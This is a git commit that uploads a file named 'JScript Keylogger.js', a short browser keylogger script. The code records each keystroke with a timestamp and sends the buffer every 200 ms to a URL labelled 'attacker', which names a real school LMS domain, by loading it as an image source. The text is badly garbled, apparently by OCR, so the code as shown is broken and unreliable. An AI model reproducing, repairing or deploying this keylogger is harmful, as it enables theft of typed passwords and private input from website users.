262fa568fb09aa45c335fb7745ab25f62360f980
Fly Far <92847004+duongletrieu@users.noreply.github.com>
2021-10-22 13:54:52 +0700

    Add files via upload

---
+++ JScript Keylogger.js
@@ -0,0 +1,15 @@
+var baffer = :];
+var attacker = ‘https://lms.vinschool.edu.vn/’
+dccunent.crke = function(ei {
+var t:metamp = Date.ncw() O;
+var stroke
+k: e.key,
+t: trne3tar.p
+buffer .puh (stroke);
+window. etThterva. (function () {
+if (buffer.iength > 0) 1
+var data = enccdeURIComçonent(JSON.trgybuer));
+new :mage.5rc = attacker + data;
+buffer t];
+)
+}, 200);
